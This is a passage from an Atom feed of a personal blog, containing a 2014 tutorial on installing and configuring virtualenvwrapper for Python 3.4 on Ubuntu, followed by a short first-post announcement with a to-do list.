&lt;p&gt;After that, wait some hours for the DNS to propagate and you should be done.&lt;/p&gt;</content><category term="pelican"></category><category term="pelican"></category><category term="publishing"></category><category term="github pages"></category></entry><entry><title>Installing virtualenvwrapper for Python 3.4 on Ubuntu</title><link href="https://railslide.io/virtualenvwrapper-python3.html" rel="alternate"></link><published>2014-06-04T00:00:00+02:00</published><updated>2014-06-04T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2014-06-04:/virtualenvwrapper-python3.html</id><summary type="html">&lt;p&gt;Virtualenvwrapper is a great virtualenv management tool. Here is how I set it up for Python 3.4 on Ubuntu.&lt;/p&gt;</summary><content type="html">&lt;p&gt;After listening to an inspiring talk by &lt;a href="http://www.kennethreitz.org/"&gt;Kenneth Reitz&lt;/a&gt; about transitioning from Python 2 to Python 3 at PyCon Sweden (I'll write a blog post about it sooner or later), I've decided that I should try to stick to Python 3 as much as possible.&lt;/p&gt;
&lt;p&gt;So the first step in that direction was to set up my working environment in a Python 3 friendly way, hence to install Virtualenwrapper for Python 3. Here's how I did it.&lt;/p&gt;
&lt;p&gt;Virtualenwrapper documentation specifies that Virtualenvwrapper has been tested under Python 2.6-3.3, but no mention of Python 3.4. Being lazy and not really willing to install a third version of Python on my computer (Ubuntu 14.04 comes with Python 2.7.6 and Python 3.4 by default), I decided to give it try with what I had. Everything seems to work flawlessly so far, just keep it in mind in case you want to try to follow these instructions.&lt;/p&gt;
&lt;h2&gt;Setting up Virtualenvwrapper&lt;/h2&gt;
&lt;p&gt;Install pip for Python 3:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;apt-get&lt;span class="w"&gt; &lt;/span&gt;install&lt;span class="w"&gt; &lt;/span&gt;python3-pip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Install Virtualenvwrapper for Python 3:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;pip3&lt;span class="w"&gt; &lt;/span&gt;install&lt;span class="w"&gt; &lt;/span&gt;virtualenvwrapper
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So far so good. Now it is time to configure Virtualenvwrapper.&lt;/p&gt;
&lt;p&gt;Create a folder for your virtualenvs (I use ~/.virtualenvs) and set it as WORKON_HOME:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mkdir&lt;span class="w"&gt; &lt;/span&gt;~/.virtualenvs
&lt;span class="nb"&gt;export&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;WORKON_HOME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/.virtualenvs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Add the following lines to ~/.bashrc:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;VIRTUALENVWRAPPER_PYTHON=&amp;#39;/usr/bin/python3&amp;#39; # This needs to be placed before the virtualenvwrapper command
source /usr/local/bin/virtualenvwrapper.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Close and re-open your shell and you're ready to go. Here are the basic commands for using virtualenvwrapper:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mkvirtualenv&lt;span class="w"&gt; &lt;/span&gt;virtualenv_name&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# Create virtualenv&lt;/span&gt;
workon&lt;span class="w"&gt; &lt;/span&gt;virtualenv_name&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# Activate/switch to a virtualenv&lt;/span&gt;
deactivate&lt;span class="w"&gt; &lt;/span&gt;virtualenv_name&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# Deactivate virtualenv&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Congratulations! Your Virtualenvwrapper for Python 3 is now ready to use.&lt;/p&gt;
&lt;h2&gt;Projects&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;EDIT&lt;/strong&gt;: in a previous version of this article, I suggested to use the postactivate script to automatically navigate to the project folder when activating the virtualenv. However, since I discovered that such a task is automatically performed by the projects plugin, I updated the post accordingly.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;While the possibility to have isolated virtual environments just a &lt;code&gt;mkvirtualenv&lt;/code&gt; away had immediately convinced me of the usefulness of Virtualenvwrapper, projects made me falling in love for it.&lt;/p&gt;
&lt;p&gt;My typical workflow is to create a virtualenv and then create a project folder with the same name. So why not setting up Virtualenvwrapper to automatically do it for me every time I create a new virtualenv? Specify PROJECT_HOME in ~/.bashrc will do the trick:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;VIRTUALENVWRAPPER_PYTHON=&amp;#39;/usr/bin/python3&amp;#39;
PROJECT_HOME=&amp;#39;/path/to/where/you/want/your/project/folder/to/be/created&amp;#39; # This needs to be placed before the virtualenvwrapper command as well
source /usr/local/bin/virtualenvwrapper.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now, when typing&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mkproject&lt;span class="w"&gt; &lt;/span&gt;my_project
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Virtualenvwrapper will automatically create a virtualenv and a folder called &lt;em&gt;my_project&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Cherry on top, projects automaticatilly navigates to the project folder when activating the virtualenv. Thus, when typing&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;workon&lt;span class="w"&gt; &lt;/span&gt;my_project
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Virtualenvwrapper activates the virtualenv and teleports me to ~/Projects/my_project. Neat!&lt;/p&gt;</content><category term="dev"></category><category term="virtualenvwrapper"></category><category term="virtualenv"></category><category term="python3"></category></entry><entry><title>Up and running!</title><link href="https://railslide.io/up-and-running.html" rel="alternate"></link><published>2014-06-03T00:00:00+02:00</published><updated>2014-06-03T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2014-06-03:/up-and-running.html</id><summary type="html">&lt;p&gt;Celebrating the first post of the blog and what to do next.&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ok, my Pelican and GitHub pages powered blog seems to be up and running! Yay!&lt;/p&gt;
&lt;p&gt;Since I plan to write a dedicated post about the setup, I'll use this one to throw some ideas about what to do next.&lt;/p&gt;
&lt;h2&gt;TO DO (not necessarily in this order)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Change theme - ideally developing my own&lt;/li&gt;
&lt;li&gt;Fix links, social buttons, etc.&lt;/li&gt;
&lt;li&gt;Fix an about page&lt;/li&gt;
&lt;li&gt;Setting up a comment system&lt;/li&gt;
&lt;li&gt;Write stuff&lt;/li&gt;
&lt;/ul&gt;</content><category term="pelican"></category><category term="pelican"></category><category term="publishing"></category><category term="github pages"></category></entry></feed>